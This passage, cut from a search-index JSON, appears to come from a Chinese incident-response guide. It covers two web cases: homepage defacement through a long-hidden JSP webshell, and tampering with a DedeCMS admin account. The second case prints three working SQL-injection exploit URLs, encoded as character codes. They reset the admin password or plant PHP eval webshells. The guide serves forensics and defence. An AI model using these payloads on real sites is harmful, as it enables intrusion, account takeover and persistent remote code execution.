\u8fdb\u4e00\u6b65\u5ba1\u67e5\u6240\u6709\u7684\u65e5\u5fd7\u6587\u4ef6(\u65e5\u5fd7\u4fdd\u5b58\u65f6\u95f4\u4ece2017-04-20\u81f32018-04-19)\uff0c\u53d1\u73b0\u4e00\u5171\u53ea\u6709\u4e24\u6b21\u8bbf\u95eeimage.jsp\u6587\u4ef6\u7684\u8bb0\u5f55\uff0c\u5206\u522b\u662f2018-04-18\u548c2017-09-21\u3002 image.jsp\u57282017-09-21\u4e4b\u524d\u5c31\u5df2\u7ecf\u4e0a\u4f20\u5230\u7f51\u7ad9\u670d\u52a1\u5668\uff0c\u5df2\u7ecf\u6f5c\u85cf\u957f\u8fbe\u534a\u5e74\u591a\u751a\u81f3\u66f4\u4e45\u7684\u65f6\u95f4\u3002 3\u3001\u5bfb\u627e\u771f\u76f8 \u6211\u4eec\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u627e\u5230\u4e86\u7b54\u6848\uff0c\u53d1\u73b0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u5b58\u5728ROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\uff0c\u5907\u4efd\u65f6\u95f4\u4e3a2017-02-28 10:35\u3002 \u901a\u8fc7\u5bf9ROOT.rar\u89e3\u538b\u7f29\uff0c\u53d1\u73b0\u6e90\u7801\u4e2d\u5b58\u5728\u7684\u811a\u672c\u6728\u9a6c\u4e0e\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\u7684\u53ef\u7591\u6587\u4ef6\u540d\u4e00\u81f4\uff08image.jsp\uff09\u3002 \u6839\u636e\u8fd9\u51e0\u4e2a\u65f6\u95f4\u8282\u70b9\uff0c\u6211\u4eec\u5c1d\u8bd5\u53bb\u8fd8\u539f\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 \u4f46\u662f\u6211\u4eec\u5728\u8bbf\u95ee\u65e5\u5fd7\u5e76\u672a\u627e\u5230ROOT.rar\u7684\u8bbf\u95ee\u4e0b\u8f7d\u8bb0\u5f55\uff0c\u8bbf\u95ee\u65e5\u5fd7\u53ea\u4fdd\u7559\u4e86\u8fd1\u4e00\u5e74\u7684\u8bb0\u5f55\uff0c\u800c\u8fd9\u4e2awebshell\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\u4e86\u591a\u5e74\u3002 \u9ed1\u5ba2\u662f\u5982\u4f55\u83b7\u53d6webshell\u7684\u5462\uff1f \u53ef\u80fd\u662f\u901a\u8fc7\u4e0b\u8f7dROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\u83b7\u53d6\u5230\u5176\u4e2d\u5b58\u5728\u7684\u6728\u9a6c\u4fe1\u606f\uff0c\u6216\u8005\u51e0\u5e74\u524d\u5165\u4fb5\u5e76\u6f5c\u85cf\u4e86\u591a\u5e74\uff0c\u53c8\u6216\u8005\u662f\u4ece\u5730\u4e0b\u9ed1\u4ea7\u8d2d\u4e70\u4e86shell\uff0c\u6211\u4eec\u4e0d\u5f97\u800c\u77e5\u3002 \u672c\u6587\u7684\u793a\u4f8b\u4e2d\u653b\u51fb\u8005\u4e3a\u6211\u4eec\u7559\u4e0b\u4e86\u5927\u91cf\u7684\u8bc1\u636e\u548c\u8bb0\u5f55\uff0c\u800c\u66f4\u591a\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6e05\u9664\u6240\u6709\u7684\u5173\u952e\u4fe1\u606f\uff0c\u8fd9\u52bf\u5fc5\u4f1a\u52a0\u5927\u8c03\u67e5\u4eba\u5458\u7684\u53d6\u8bc1\u96be\u5ea6\u3002","title":"\u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC7%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9/#\u7b2c7\u7bc7\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539","text":"\u200b \u7f51\u7ad9\u9996\u9875\u88ab\u975e\u6cd5\u7be1\u6539\uff0c\u662f\u7684\uff0c\u5c31\u662f\u4f60\u4e00\u6253\u5f00\u7f51\u7ad9\u5c31\u77e5\u9053\u81ea\u5df1\u7684\u7f51\u7ad9\u51fa\u73b0\u4e86\u5b89\u5168\u95ee\u9898\uff0c\u7f51\u7ad9\u7a0b\u5e8f\u5b58\u5728\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u4e0a\u4f20\u811a\u672c\u6728\u9a6c\uff0c\u4ece\u800c\u5bf9\u7f51\u7ad9\u5185\u5bb9\u8fdb\u884c\u7be1\u6539\u3002\u800c\u8fd9\u79cd\u7be1\u6539\u4e8b\u4ef6\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\uff0c\u4f1a\u88ab\u65e0\u9650\u653e\u5927\u3002","title":"\u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC7%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9/#\u73b0\u8c61\u63cf\u8ff0","text":"\u7f51\u7ad9\u9996\u9875\u88ab\u6076\u610f\u7be1\u6539\uff0c\u6bd4\u5982\u590d\u5236\u539f\u6765\u7684\u56fe\u7247\uff0cPS\u4e00\u4e0b\uff0c\u7136\u540e\u66ff\u6362\u4e0a\u53bb\u3002","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC7%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9/#\u95ee\u9898\u5904\u7406","text":"1\u3001 \u786e\u8ba4\u7be1\u6539\u65f6\u95f4 \u901a\u8fc7\u5bf9\u88ab\u7be1\u6539\u7684\u56fe\u7247\u8fdb\u884c\u67e5\u770b\uff0c\u786e\u8ba4\u56fe\u7247\u7be1\u6539\u65f6\u95f4\u4e3a2018\u5e7404\u670818\u65e5 19:24:07 \u3002 2\u3001\u8bbf\u95ee\u65e5\u5fd7\u6eaf\u6e90 \u901a\u8fc7\u56fe\u7247\u4fee\u6539\u7684\u65f6\u95f4\u8282\u70b9\uff0c\u53d1\u73b0\u53ef\u7591IP\uff1a113.xx.xx.24 \uff08\u4ee3\u7406IP\uff0c\u65e0\u6cd5\u8ffd\u6eaf\u771f\u5b9e\u6765\u6e90\uff09\uff0c\u8bbf\u95eeimage.jsp\uff08\u811a\u672c\u6728\u9a6c\uff09\uff0c\u5e76\u968f\u540e\u8bbf\u95ee\u4e86\u88ab\u7be1\u6539\u7684\u56fe\u7247\u5730\u5740\u3002 \u8fdb\u4e00\u6b65\u5ba1\u67e5\u6240\u6709\u7684\u65e5\u5fd7\u6587\u4ef6(\u65e5\u5fd7\u4fdd\u5b58\u65f6\u95f4\u4ece2017-04-20\u81f32018-04-19)\uff0c\u53d1\u73b0\u4e00\u5171\u53ea\u6709\u4e24\u6b21\u8bbf\u95eeimage.jsp\u6587\u4ef6\u7684\u8bb0\u5f55\uff0c\u5206\u522b\u662f2018-04-18\u548c2017-09-21\u3002 image.jsp\u57282017-09-21\u4e4b\u524d\u5c31\u5df2\u7ecf\u4e0a\u4f20\u5230\u7f51\u7ad9\u670d\u52a1\u5668\uff0c\u5df2\u7ecf\u6f5c\u85cf\u957f\u8fbe\u534a\u5e74\u591a\u751a\u81f3\u66f4\u4e45\u7684\u65f6\u95f4\u3002 3\u3001\u5bfb\u627e\u771f\u76f8 \u6211\u4eec\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u627e\u5230\u4e86\u7b54\u6848\uff0c\u53d1\u73b0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u5b58\u5728ROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\uff0c\u5907\u4efd\u65f6\u95f4\u4e3a2017-02-28 10:35\u3002 \u901a\u8fc7\u5bf9ROOT.rar\u89e3\u538b\u7f29\uff0c\u53d1\u73b0\u6e90\u7801\u4e2d\u5b58\u5728\u7684\u811a\u672c\u6728\u9a6c\u4e0e\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\u7684\u53ef\u7591\u6587\u4ef6\u540d\u4e00\u81f4\uff08image.jsp\uff09\u3002 \u6839\u636e\u8fd9\u51e0\u4e2a\u65f6\u95f4\u8282\u70b9\uff0c\u6211\u4eec\u5c1d\u8bd5\u53bb\u8fd8\u539f\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 \u4f46\u662f\u6211\u4eec\u5728\u8bbf\u95ee\u65e5\u5fd7\u5e76\u672a\u627e\u5230ROOT.rar\u7684\u8bbf\u95ee\u4e0b\u8f7d\u8bb0\u5f55\uff0c\u8bbf\u95ee\u65e5\u5fd7\u53ea\u4fdd\u7559\u4e86\u8fd1\u4e00\u5e74\u7684\u8bb0\u5f55\uff0c\u800c\u8fd9\u4e2awebshell\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\u4e86\u591a\u5e74\u3002 \u9ed1\u5ba2\u662f\u5982\u4f55\u83b7\u53d6webshell\u7684\u5462\uff1f \u53ef\u80fd\u662f\u901a\u8fc7\u4e0b\u8f7dROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\u83b7\u53d6\u5230\u5176\u4e2d\u5b58\u5728\u7684\u6728\u9a6c\u4fe1\u606f\uff0c\u6216\u8005\u51e0\u5e74\u524d\u5165\u4fb5\u5e76\u6f5c\u85cf\u4e86\u591a\u5e74\uff0c\u53c8\u6216\u8005\u662f\u4ece\u5730\u4e0b\u9ed1\u4ea7\u8d2d\u4e70\u4e86shell\uff0c\u6211\u4eec\u4e0d\u5f97\u800c\u77e5\u3002 \u672c\u6587\u7684\u793a\u4f8b\u4e2d\u653b\u51fb\u8005\u4e3a\u6211\u4eec\u7559\u4e0b\u4e86\u5927\u91cf\u7684\u8bc1\u636e\u548c\u8bb0\u5f55\uff0c\u800c\u66f4\u591a\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6e05\u9664\u6240\u6709\u7684\u5173\u952e\u4fe1\u606f\uff0c\u8fd9\u52bf\u5fc5\u4f1a\u52a0\u5927\u8c03\u67e5\u4eba\u5458\u7684\u53d6\u8bc1\u96be\u5ea6\u3002","title":"\u95ee\u9898\u5904\u7406"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9/","text":"\u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u00b6 \u200b \u4f60\u662f\u67d0\u4e00\u4e2a\u7f51\u7ad9\u7684\u7ba1\u7406\u5458\uff0c\u6709\u4e00\u5929\uff0c\u4f60\u7684\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u767b\u5f55\u4e0d\u4e86\uff0c\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u770b\uff0c\u539f\u6765\u7ba1\u7406\u5458\u8d26\u53f7\u7528\u6237\u540d\u4e0d\u5b58\u5728\u4e86\uff0c\u5374\u591a\u4e86\u53e6\u5916\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\u540d\u3002\u4e0d\u5bf9\uff0c\u4e0d\u662f\u65b0\u589e\u4e86\u7ba1\u7406\u5458\uff0c\u800c\u662f\u4f60\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u88ab\u7be1\u6539\u4e86\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u524d\u540e\u7aef\u5206\u79bb\uff0c\u540e\u53f0\u53ea\u5141\u8bb8\u5185\u7f51\u8bbf\u95ee\uff0c\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u4f9d\u7136\u88ab\u591a\u6b21\u88ab\u7be1\u6539 \u95ee\u9898\u5904\u7406 \u00b6 1\u3001\u7f51\u7ad9webshell \u5728\u9488\u5bf9\u7f51\u7ad9\u6839\u76ee\u5f55\u8fdb\u884cwebshell\u626b\u63cf\uff0c\u53d1\u73b0\u5b58\u5728\u811a\u672c\u6728\u9a6c\uff0c\u521b\u5efa\u65f6\u95f4\u4e3a2018-06-13 04:30:30 2\u3001 \u5b9a\u4f4dIP \u901a\u8fc7\u6728\u9a6c\u521b\u5efa\u65f6\u95f4\uff0c \u67e5\u770b\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5b9a\u4f4d\u5230IP\u4e3a\uff1a180.xx.xx.3 3\u3001\u5173\u8054\u5206\u6790 \u5168\u5c40\u641c\u7d22\u4e0e\u8be5IP\u6709\u5173\u7684\u64cd\u4f5c\u65e5\u5fd7\uff1a \u5728\u811a\u672c\u6728\u9a6c\u751f\u6210\u524d\uff0c\u6709\u4e24\u6761\u6bd4\u8f83\u53ef\u7591\u7684\u8bbf\u95ee\u65e5\u5fd7\u5438\u5f15\u4e86\u6211\u4eec\u7684\u6ce8\u610f\uff1a 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1\" 200 67 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/ad_js.php?aid=19 HTTP/1.1\" 200 32 \u5bf9\u8fd9\u6bb5POC\u8fdb\u884c\u89e3\u7801\uff0c\u6211\u4eec\u53d1\u73b0\u901a\u8fc7\u8fd9\u4e2apoc\u53ef\u4ee5\u5f80\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u6570\u636e\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u89e3\u7801\u540e\uff1a cfg_dbprefixmyad SET normbody = '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE aid` =19 # \u7efc\u4e0a\uff0c\u53ef\u4ee5\u63a8\u6d4b/plus/download.php\u4e2d\u53ef\u80fd\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u63a5\u4e0b\u6765\uff0c\u6536\u96c6\u7f51\u4e0a\u5df2\u516c\u5f00\u7684\u6709\u4ee5\u4e0b3\u79cdEXP\u8fdb\u884c\u6f0f\u6d1e\u590d\u73b0\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5229\u7528\u65b9\u5f0f\u4e00\uff1a\u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458 1\u3001\u65b0\u5efa\u7ba1\u7406\u5458\u8d26\u53f7test/test123789\uff0c\u53ef\u4ee5\u6210\u529f\u767b\u5f55\u7f51\u7ad9\u540e\u53f0 2\u3001\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixadmin SETuserid='spider',pwd ='f297a57a5a743894a0e4' where id=19 #` \u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458\u4e3a\uff1a\u7528\u6237\u540dspider\uff0c\u5bc6\u7801admin\u3002 \uff083\uff09\u5bf9\u5e94\u7684EXP: \uff1fopen=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=97&arrs2[]=100&arrs2[]=109&arrs2[]=105&arrs2[]=110&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=117&arrs2[]=115&arrs2[]=101&arrs2[]=114&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=115&arrs2[]=112&arrs2[]=105&arrs2[]=100&arrs2[]=101&arrs2[]=114&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=96&arrs2[]=112&arrs2[]=119&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=102&arrs2[]=50&arrs2[]=57&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=97&arrs2[]=55&arrs2[]=52&arrs2[]=51&arrs2[]=56&arrs2[]=57&arrs2[]=52&arrs2[]=97&arrs2[]=48&arrs2[]=101&arrs2[]=52&arrs2[]=39&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=105&arrs2[]=100&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \u6267\u884cEXP\u540e\uff0c\u76f8\u5e94\u540e\u53f0\u6570\u636e\u5e93\u8868\u53d8\u4e3a\u5982\u4e0b\uff1a \uff084\uff09\u56e0\u6b64\u76f8\u5e94\u540e\u53f0\u767b\u5f55\u7528\u6237\u53d8\u4e3aspider\u5bc6\u7801admin \u5229\u7528\u65b9\u5f0f\u4e8c\uff1a\u901a\u8fc7/plus/mytag_js.php\u6587\u4ef6\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a `cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@\\','{dede:php}file_put_contents(''90sec.php'',''<?php eval($_POST[guige]);?>'');{/dede:php}') # @\\'`` \uff082\uff09\u5bf9\u5e94\u7684EXP: ?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_mytag\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\uff0c \uff084\uff09\u6267\u884c\u5982\u4e0b\u8bed\u53e5\uff0c\u5728/plus\u76ee\u5f55\u4e0b\u751f\u621090sec.php\u4e00\u53e5\u8bdd\u6728\u9a6c http://www.xxxx.com/plus/mytag_js.php?aid=9013 \u5229\u7528\u65b9\u5f0f\u4e09\uff1a\u4f7f/plus/ad_js.php\u6587\u4ef6\u53d8\u4e3a\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixmyadSETnormbody= '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHEREaid =19 #` \uff082\uff09\u5bf9\u5e94\u7684EXP: /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_myad\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\u3002 \uff084\uff09\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u5220\u9664\u7f51\u7ad9\u76ee\u5f55\u4e2d\u7684webshell 2\u3001\u6e05\u9664dede_myad\u3001dede_mytag\u6570\u636e\u5e93\u8868\u4e2d\u63d2\u5165\u7684SQL\u8bed\u53e5\uff0c\u9632\u6b62\u518d\u6b21\u88ab\u8c03\u7528\u751f\u6210webshell\u3002 \u5982\u4f55\u9632\u5fa1\uff1f \u7f51\u7ad9\u91c7\u7528\u5f00\u6e90CMS\u642d\u5efa\uff0c\u5efa\u8bae\u53ca\u65f6\u5bf9\u5b98\u65b9\u53d1\u5e03\u7684\u7cfb\u7edf\u8865\u4e01\u4ee5\u53ca\u5185\u6838\u7248\u672c\u8fdb\u884c\u5347\u7ea7\u3002","title":"8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9/#\u7b2c8\u7bc7\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539","text":"\u200b 